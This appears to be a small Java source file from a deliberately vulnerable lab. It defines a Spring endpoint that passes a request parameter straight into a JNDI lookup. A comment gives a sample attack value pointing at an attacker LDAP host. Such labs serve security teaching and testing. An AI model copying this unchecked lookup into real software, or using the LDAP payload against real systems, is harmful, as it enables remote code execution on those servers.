package vulnlab.jndi;

import javax.naming.InitialContext;
import org.springframework.web.bind.annotation.*;

/** JNDI : name = ldap://attaquant/Exploit */
@RestController
public class JndiLookup {
    @GetMapping("/jndi/lookup")
    public String handle(@RequestParam String resource) throws Exception {
        Object found = new InitialContext().lookup(resource);
        return String.valueOf(found);
    }
}
